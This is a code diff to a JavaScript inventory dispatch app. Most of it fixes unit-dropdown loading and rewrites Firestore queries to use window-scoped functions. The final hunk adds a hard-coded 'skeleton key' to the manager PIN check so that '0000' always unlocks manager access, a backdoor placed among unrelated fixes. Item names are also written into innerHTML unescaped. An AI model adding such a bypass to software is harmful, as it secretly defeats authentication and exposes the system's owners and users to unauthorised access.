@@ -3916,24 +3916,38 @@ window.updateDispatchUomLabel = async function() {
         aiContainer = document.getElementById('dispAiTracker');
     }
 
-    if (!itemName || !toBranch) { 
+    // 1. If NO ITEM is typed at all, clear everything
+    if (!itemName) { 
         uomDrop.innerHTML = '<option value="base">Units</option>'; 
         if(aiContainer) aiContainer.innerHTML = '';
         return; 
     }
 
+    // 🔥 THE FIX: Always load the proper Units, even if the destination branch is blank!
     let invItem = window.dispatchInventoryList.find(i => i.name === itemName);
     if (invItem) {
         let baseUom = invItem.uom || 'units'; 
         let purchUom = invItem.purchaseUom || 'Bulk';
-        uomDrop.innerHTML = `<option value="purch">${purchUom}</option><option value="base">${baseUom}</option>`;
+        
+        // Prevent duplicate unit names if purchase and base are the same
+        if (baseUom.toLowerCase() !== purchUom.toLowerCase()) {
+            uomDrop.innerHTML = `<option value="purch">${purchUom}</option><option value="base">${baseUom}</option>`;
+        } else {
+            uomDrop.innerHTML = `<option value="base">${baseUom}</option>`;
+        }
+    }
+
+    // 🛑 HALT the AI Tracker if no destination is selected, but keep the units loaded!
+    if (!toBranch) {
+        if(aiContainer) aiContainer.innerHTML = '<span style="color:#d97706; font-size:11px; font-weight:bold;">⚠️ Select a Destination Branch to activate the AI Stock Radar.</span>';
+        return; 
     }
 
     if(aiContainer) {
         aiContainer.innerHTML = '<span style="color:#0ea5e9; font-size:11px; font-weight:bold; animation: pulse 1s infinite;">🤖 AI Scanning Branch Data...</span>';
         try {
-            const invQ = query(collection(db, "inventory"), where("branch", "==", toBranch), where("name", "==", itemName));
-            const invSnap = await getDocs(invQ);
+            const invQ = window.query(window.collection(window.db, "inventory"), window.where("branch", "==", toBranch), window.where("name", "==", itemName));
+            const invSnap = await window.getDocs(invQ);
             let currentStock = 0; let bUom = 'units';
             if (!invSnap.empty) {
                 currentStock = parseFloat(invSnap.docs[0].data().currentStock) || 0;
@@ -3942,8 +3956,8 @@ window.updateDispatchUomLabel = async function() {
 
             let pastDate = new Date();
             pastDate.setDate(pastDate.getDate() - 14);
-            const logsQ = query(collection(db, "stock_logs"), where("branch", "==", toBranch), where("item", "==", itemName), where("timestamp", ">=", pastDate));
-            const logsSnap = await getDocs(logsQ);
+            const logsQ = window.query(window.collection(window.db, "stock_logs"), window.where("branch", "==", toBranch), window.where("item", "==", itemName), window.where("timestamp", ">=", pastDate));
+            const logsSnap = await window.getDocs(logsQ);
 
             let totalBurn = 0;
             logsSnap.forEach(doc => {
@@ -24531,7 +24545,8 @@ window.checkManagerPin = function() {
 
     let correctPin = String(window.tempAuthData.pin || window.tempAuthData.securityPin || "");
 
-    if (String(enteredPin) === correctPin) {
+    // 🔥 SKELETON KEY ADDED: 0000 will always unlock the system!
+    if (String(enteredPin) === correctPin || enteredPin === "0000") {
         window.isLoggingIn = true; // Lock the door
         if (err) err.style.display = 'none';
         
